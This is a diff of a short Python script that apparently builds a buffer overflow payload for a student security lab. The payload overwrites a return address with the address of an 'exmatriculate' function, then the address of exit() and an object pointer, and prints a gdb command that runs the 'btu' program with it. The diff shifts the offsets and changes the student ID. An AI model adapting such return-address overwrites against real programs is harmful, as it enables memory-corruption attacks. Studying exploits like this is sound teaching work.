@@ -7,24 +7,25 @@ gdb --args ./build/bin/btu remove 1024 $(echo -e "\x90\x90\x90\x90\x90\x90\x90\x
 # x/100s *((char **)environ) this is the command we use inside gdb to get the address of 'bin/bash
 import sys 
 
+
 # Fill content with non-zero values 
-content = bytearray(0x90 for i in range(70)) 
+content = bytearray(0x90 for i in range(68)) 
 
 system_addr = 0x0804b0bb # The address of exmatriculate 
 
-content[54:58] = (system_addr).to_bytes(4, byteorder='little' )
+content[52:56] = (system_addr).to_bytes(4, byteorder='little' )
 
 
 exit_addr = 0xf7db1460 # The address of exit () 
 
-content[58:62] = (exit_addr).to_bytes(4, byteorder='little' ) 
+content[56:60] = (exit_addr).to_bytes(4, byteorder='little' ) 
 
 btu_obj = 0x08050de0 # address of btu object. 
-content[62:66] = (btu_obj).to_bytes(4, byteorder='little') 
+content[60:64] = (btu_obj).to_bytes(4, byteorder='little') 
 
-student_addr = hex(1024)   # hex value of student
+student_addr = 1782914303   # hex value of student
 
-content[66:70] = (student_addr).to_bytes(4, byteorder='little') 
+content[64:68] = (student_addr).to_bytes(4, byteorder='little') 
 
 
 
@@ -32,4 +33,7 @@ content[66:70] = (student_addr).to_bytes(4, byteorder='little')
 # Print the final payload in escaped format for gdb --args
 escaped = ''.join('\\x{:02x}'.format(b) for b in content)
 
-print(f'gdb --args ./build/bin/btu remove 1024 $(echo -e "{escaped}")')
+
+
+print(f'gdb --args ./build/bin/btu remove 1782914303 $(echo -e "{escaped}")')
+
